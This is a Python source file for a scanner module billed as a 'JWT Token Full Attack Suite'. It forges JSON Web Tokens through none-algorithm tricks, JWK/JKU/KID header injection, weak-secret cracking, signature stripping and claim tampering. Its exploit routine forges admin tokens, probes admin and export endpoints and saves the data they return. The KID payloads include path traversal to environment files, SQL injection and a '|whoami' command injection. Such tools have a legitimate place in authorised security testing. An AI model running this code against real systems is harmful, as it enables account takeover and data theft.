import re
import json
import base64
import hmac
import hashlib
from modules.base import BaseModule


class JwtModule(BaseModule):
    name = "jwt"
    description = "JWT Token Full Attack Suite"
    exploitable = True
    
    weak_secrets = [
        "secret", "password", "123456", "admin", "key", "private",
        "jwt_secret", "your-256-bit-secret", "your-secret-key",
        "changeme", "test", "development", "production", "supersecret",
        "jwt", "token", "auth", "authentication", "HS256", "hmac",
        "", "null", "undefined", "none", "default", "example",
        "qwerty", "password123", "letmein", "welcome", "monkey",
        "shadow", "sunshine", "princess", "football", "baseball",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.cracked_secrets = []
        
        resp = await self.http.get(target)
        if not resp.get("status"):
            return self.findings
        
        tokens = self._find_jwt_tokens(resp)
        
        if not tokens:
            tokens = await self._trigger_token_generation(target)
        
        for token in tokens:
            await self._full_token_analysis(target, token)
        
        if self.aggressive:
            await self._test_jwk_injection(target, tokens)
            await self._test_jku_injection(target, tokens)
            await self._test_kid_injection(target, tokens)
        
        return self.findings
    
    async def _test_jwk_injection(self, target, tokens):
        for token in tokens:
            try:
                parts = token.split(".")
                header = self._decode_part(parts[0])
                payload = self._decode_part(parts[1])
                
                if not header or not payload:
                    continue
                
                new_header = header.copy()
                new_header["alg"] = "HS256"
                new_header["jwk"] = {
                    "kty": "oct",
                    "k": base64.urlsafe_b64encode(b"attacker-secret").decode().rstrip("=")
                }
                
                forged = self._sign_token(new_header, payload, "attacker-secret", "HS256")
                if forged:
                    resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
                    if self._check_auth_success(resp):
                        self.add_finding(
                            "CRITICAL",
                            "JWT JWK Injection - Key Embedding Attack",
                            url=target,
                            evidence="Server used attacker-embedded key",
                            confidence_evidence=["jwk_injection", "auth_bypass"],
                            request_data={"method": "GET", "url": target}
                        )
                        return
            except:
                pass
    
    async def _test_jku_injection(self, target, tokens):
        oob_manager = self.config.get("oob_manager")
        callback_host = self.config.get("callback_host")
        
        if not callback_host and not oob_manager:
            return
        
        jku_url = f"http://{callback_host}/jwks.json" if callback_host else oob_manager.get_http_url("jku-test")
        
        for token in tokens:
            try:
                parts = token.split(".")
                header = self._decode_part(parts[0])
                payload = self._decode_part(parts[1])
                
                if not header or not payload:
                    continue
                
                new_header = header.copy()
                new_header["alg"] = "RS256"
                new_header["jku"] = jku_url
                
                forged = f"{self._encode_part(new_header)}.{self._encode_part(payload)}.fakesig"
                resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
                
                if oob_manager:
                    import asyncio
                    await asyncio.sleep(2)
                    interactions = oob_manager.check_interactions("jku-test")
                    if interactions:
                        self.add_finding(
                            "CRITICAL",
                            "JWT JKU Injection - Server Fetched External JWKS",
                            url=target,
                            evidence=f"Server contacted: {jku_url}",
                            confidence_evidence=["jku_injection", "ssrf_via_jwt"],
                            request_data={"method": "GET", "url": target}
                        )
                        return
            except:
                pass
    
    async def _test_kid_injection(self, target, tokens):
        kid_payloads = [
            ("../../../../../../dev/null", "null file"),
            ("../../../../../../etc/hostname", "file read"),
            ("'; SELECT * FROM keys; --", "sql injection"),
            ("|whoami", "command injection"),
            ("../../../../../../../proc/self/environ", "environ read"),
        ]
        
        for token in tokens:
            try:
                parts = token.split(".")
                header = self._decode_part(parts[0])
                payload = self._decode_part(parts[1])
                
                if not header or not payload:
                    continue
                
                for kid_payload, attack_type in kid_payloads:
                    new_header = header.copy()
                    new_header["kid"] = kid_payload
                    
                    if "null" in kid_payload:
                        forged = self._sign_token(new_header, payload, "", "HS256")
                    else:
                        forged = f"{self._encode_part(new_header)}.{self._encode_part(payload)}.fakesig"
                    
                    if forged:
                        resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
                        if self._check_auth_success(resp):
                            self.add_finding(
                                "CRITICAL",
                                f"JWT KID Injection ({attack_type})",
                                url=target,
                                evidence=f"KID: {kid_payload[:30]}",
                                confidence_evidence=["kid_injection", attack_type.replace(" ", "_")],
                                request_data={"method": "GET", "url": target}
                            )
                            return
            except:
                pass
    
    def _find_jwt_tokens(self, resp):
        tokens = set()
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        
        text_tokens = re.findall(jwt_pattern, resp.get("text", ""))
        tokens.update(text_tokens)
        
        for header, value in resp.get("headers", {}).items():
            if "authorization" in header.lower() or "token" in header.lower():
                match = re.search(jwt_pattern, str(value))
                if match:
                    tokens.add(match.group())
        
        cookies = resp.get("headers", {}).get("Set-Cookie", "")
        cookie_tokens = re.findall(jwt_pattern, str(cookies))
        tokens.update(cookie_tokens)
        
        return list(tokens)
    
    async def _trigger_token_generation(self, target):
        tokens = []
        
        login_endpoints = ["/login", "/auth", "/api/login", "/api/auth", "/api/token"]
        
        for endpoint in login_endpoints:
            url = target.rstrip('/') + endpoint
            
            resp = await self.http.post(url, json={"username": "test", "password": "test"})
            if resp.get("status"):
                found = self._find_jwt_tokens(resp)
                tokens.extend(found)
            
            resp = await self.http.post(url, data={"username": "test", "password": "test"})
            if resp.get("status"):
                found = self._find_jwt_tokens(resp)
                tokens.extend(found)
        
        return list(set(tokens))
    
    async def _full_token_analysis(self, target, token):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            
            header = self._decode_part(parts[0])
            payload = self._decode_part(parts[1])
            
            if not header or not payload:
                return
            
            self._analyze_claims(target, token, header, payload)
            await self._test_none_algorithm(target, token, header, payload)
            await self._test_algorithm_confusion(target, token, header, payload)
            await self._test_claim_tampering(target, token, header, payload)
            await self._test_weak_secret(target, token, header)
            await self._test_expired_token(target, token, header, payload)
            await self._test_signature_stripping(target, token, header, payload)
            
        except Exception:
            pass
    
    def _decode_part(self, part):
        try:
            padding = 4 - len(part) % 4
            if padding != 4:
                part += "=" * padding
            decoded = base64.urlsafe_b64decode(part)
            return json.loads(decoded)
        except:
            return None
    
    def _encode_part(self, data):
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
        return encoded.rstrip("=")
    
    def _sign_token(self, header, payload, secret, algorithm="HS256"):
        header_b64 = self._encode_part(header)
        payload_b64 = self._encode_part(payload)
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "HS256":
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        elif algorithm == "HS384":
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        elif algorithm == "HS512":
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
        else:
            return None
        
        sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")
        return f"{header_b64}.{payload_b64}.{sig_b64}"
    
    def _analyze_claims(self, target, token, header, payload):
        issues = []
        
        alg = header.get("alg", "")
        if alg in ["HS256", "HS384", "HS512"]:
            issues.append(f"Symmetric algorithm ({alg}) - brute-forceable")
        
        if not payload.get("exp"):
            issues.append("No expiration (exp) claim")
        
        if not payload.get("iat"):
            issues.append("No issued-at (iat) claim")
        
        if not payload.get("nbf"):
            issues.append("No not-before (nbf) claim")
        
        if not payload.get("iss"):
            issues.append("No issuer (iss) claim")
        
        if not payload.get("aud"):
            issues.append("No audience (aud) claim")
        
        admin_keys = ["admin", "is_admin", "isAdmin", "role", "roles", "permissions", "priv", "privilege"]
        for key in admin_keys:
            if key in payload:
                issues.append(f"Privilege claim present: {key}={payload[key]}")
        
        sensitive_keys = ["password", "secret", "key", "credit_card", "ssn", "api_key"]
        for key in sensitive_keys:
            if key in payload:
                issues.append(f"Sensitive data in token: {key}")
        
        if issues:
            self.add_finding(
                "MEDIUM" if len(issues) < 3 else "HIGH",
                "JWT Claim Issues",
                url=target,
                evidence="; ".join(issues[:5])
            )
    
    async def _test_none_algorithm(self, target, token, header, payload):
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]
        
        for alg in none_variants:
            new_header = header.copy()
            new_header["alg"] = alg
            
            forged_tokens = [
                f"{self._encode_part(new_header)}.{self._encode_part(payload)}.",
                f"{self._encode_part(new_header)}.{self._encode_part(payload)}",
                f"{self._encode_part(new_header)}.{self._encode_part(payload)}.''",
            ]
            
            for forged_token in forged_tokens:
                resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged_token}"})
                
                if self._check_auth_success(resp):
                    self.add_finding(
                        "CRITICAL",
                        "JWT None Algorithm Bypass",
                        url=target,
                        evidence=f"Algorithm: {alg}, Token accepted without signature"
                    )
                    return
    
    async def _test_algorithm_confusion(self, target, token, header, payload):
        orig_alg = header.get("alg", "")
        
        if orig_alg.startswith("RS") or orig_alg.startswith("ES"):
            self.add_finding(
                "MEDIUM",
                f"JWT Uses Asymmetric Algorithm ({orig_alg})",
                url=target,
                evidence="Test key confusion: sign with HS256 using public key as secret"
            )
            
            new_header = header.copy()
            new_header["alg"] = "HS256"
            
            test_token = f"{self._encode_part(new_header)}.{self._encode_part(payload)}.fake_sig"
            
            resp = await self.http.get(target, headers={"Authorization": f"Bearer {test_token}"})
            
            if resp.get("status") == 200 and "unauthorized" not in resp.get("text", "").lower():
                self.add_finding(
                    "HIGH",
                    "JWT Algorithm Confusion Possible",
                    url=target,
                    evidence=f"Server accepted HS256 token (original: {orig_alg})"
                )
    
    async def _test_claim_tampering(self, target, token, header, payload):
        orig_alg = header.get("alg", "")
        
        privilege_escalations = [
            {"admin": True},
            {"is_admin": True},
            {"isAdmin": True},
            {"role": "admin"},
            {"roles": ["admin"]},
            {"permissions": ["*"]},
            {"user_id": 1},
            {"uid": 1},
            {"sub": "admin"},
        ]
        
        for escalation in privilege_escalations:
            tampered_payload = payload.copy()
            tampered_payload.update(escalation)
            
            new_header = header.copy()
            new_header["alg"] = "none"
            
            tampered_token = f"{self._encode_part(new_header)}.{self._encode_part(tampered_payload)}."
            
            resp = await self.http.get(target, headers={"Authorization": f"Bearer {tampered_token}"})
            
            if self._check_auth_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "JWT Privilege Escalation via Claim Tampering",
                    url=target,
                    evidence=f"Tampered claim accepted: {list(escalation.keys())[0]}"
                )
                return
            
            for secret in self.weak_secrets[:5]:
                if orig_alg.startswith("HS"):
                    signed_token = self._sign_token(header, tampered_payload, secret, orig_alg)
                    if signed_token:
                        resp = await self.http.get(target, headers={"Authorization": f"Bearer {signed_token}"})
                        if self._check_auth_success(resp):
                            self.add_finding(
                                "CRITICAL",
                                "JWT Claim Tampering with Known Secret",
                                url=target,
                                evidence=f"Secret: {secret}, Escalation: {list(escalation.keys())[0]}"
                            )
                            return
    
    async def _test_weak_secret(self, target, token, header):
        parts = token.split(".")
        message = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]
        
        alg = header.get("alg", "HS256")
        
        if not alg.startswith("HS"):
            return
        
        hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
        
        for secret in self.weak_secrets:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hash_func).digest()
            ).decode().rstrip("=")
            
            if sig == original_sig:
                self.add_finding(
                    "CRITICAL",
                    "JWT Secret Cracked",
                    url=target,
                    evidence=f"Secret: '{secret}' (Algorithm: {alg})"
                )
                return
        
        self.add_finding(
            "INFO",
            "JWT Secret Not In Common List",
            url=target,
            evidence=f"Tested {len(self.weak_secrets)} common secrets"
        )
    
    async def _test_expired_token(self, target, token, header, payload):
        import time
        
        exp = payload.get("exp")
        if exp and exp < time.time():
            resp = await self.http.get(target, headers={"Authorization": f"Bearer {token}"})
            
            if self._check_auth_success(resp):
                self.add_finding(
                    "HIGH",
                    "Expired JWT Token Accepted",
                    url=target,
                    evidence=f"Token expired at {exp}, still accepted"
                )
    
    async def _test_signature_stripping(self, target, token, header, payload):
        parts = token.split(".")
        
        stripped_tokens = [
            f"{parts[0]}.{parts[1]}.",
            f"{parts[0]}.{parts[1]}",
            f"{parts[0]}.{parts[1]}.null",
            f"{parts[0]}.{parts[1]}.undefined",
        ]
        
        for stripped in stripped_tokens:
            resp = await self.http.get(target, headers={"Authorization": f"Bearer {stripped}"})
            
            if self._check_auth_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "JWT Signature Not Verified",
                    url=target,
                    evidence="Token accepted with missing/invalid signature"
                )
                return
    
    def _check_auth_success(self, resp):
        if not resp.get("status"):
            return False
        
        if resp["status"] in [200, 201]:
            text = resp.get("text", "").lower()
            
            failure_indicators = ["unauthorized", "invalid", "expired", "forbidden", "denied", "error", "failed"]
            success_indicators = ["welcome", "dashboard", "profile", "user", "account", "data", "success"]
            
            has_failure = any(f in text for f in failure_indicators)
            has_success = any(s in text for s in success_indicators)
            
            if has_success and not has_failure:
                return True
            
            if not has_failure and len(text) > 100:
                return True
        
        return False
    
    async def exploit(self, target, finding):
        import time
        
        extracted = {"forged_tokens": [], "accessed_endpoints": [], "extracted_data": {}}
        
        evidence = finding.get("evidence", "")
        cracked_secret = None
        
        secret_match = re.search(r"Secret:\s*'([^']*)'", evidence)
        if secret_match:
            cracked_secret = secret_match.group(1)
        
        if not cracked_secret:
            for secret in self.weak_secrets:
                if secret in evidence.lower():
                    cracked_secret = secret
                    break
        
        if not cracked_secret and "none" in evidence.lower().replace(" ", ""):
            cracked_secret = None
            use_none_alg = True
        else:
            use_none_alg = False
        
        admin_payloads = [
            {"sub": "admin", "role": "admin", "admin": True, "is_admin": True},
            {"sub": "administrator", "role": "administrator", "permissions": ["*"]},
            {"sub": "root", "role": "superadmin", "uid": 1, "user_id": 1},
        ]
        
        protected_endpoints = [
            "/api/admin", "/admin", "/api/users", "/api/admin/users",
            "/dashboard", "/api/settings", "/api/config",
            "/api/v1/admin", "/api/v2/admin", "/management",
            "/api/accounts", "/api/data", "/api/export",
        ]
        
        from urllib.parse import urlparse
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for admin_payload in admin_payloads:
            payload = {
                "iat": int(time.time()),
                "exp": int(time.time()) + 86400,
                "nbf": int(time.time()) - 60,
                **admin_payload
            }
            
            if use_none_alg:
                header = {"alg": "none", "typ": "JWT"}
                forged = f"{self._encode_part(header)}.{self._encode_part(payload)}."
            elif cracked_secret:
                header = {"alg": "HS256", "typ": "JWT"}
                forged = self._sign_token(header, payload, cracked_secret, "HS256")
            else:
                continue
            
            if not forged:
                continue
            
            extracted["forged_tokens"].append({
                "token": forged[:50] + "...",
                "claims": admin_payload,
                "algorithm": "none" if use_none_alg else "HS256"
            })
            
            for endpoint in protected_endpoints:
                url = base + endpoint
                
                for auth_header in ["Authorization", "X-Auth-Token", "X-Access-Token"]:
                    for prefix in ["Bearer ", ""]:
                        resp = await self.http.get(url, headers={auth_header: f"{prefix}{forged}"})
                        
                        if self._check_auth_success(resp):
                            extracted["accessed_endpoints"].append({
                                "url": url,
                                "method": "GET",
                                "header": auth_header,
                                "status": resp.get("status")
                            })
                            
                            text = resp.get("text", "")
                            if len(text) > 0:
                                try:
                                    data = json.loads(text)
                                    extracted["extracted_data"][endpoint] = data
                                except:
                                    extracted["extracted_data"][endpoint] = text[:500]
                            
                            self.add_finding(
                                "CRITICAL",
                                f"JWT EXPLOITED: Admin access gained to {endpoint}",
                                url=url,
                                evidence=f"Forged token accepted, data extracted"
                            )
        
        if extracted["accessed_endpoints"]:
            self.exploited_data = extracted
            return extracted
        
        return None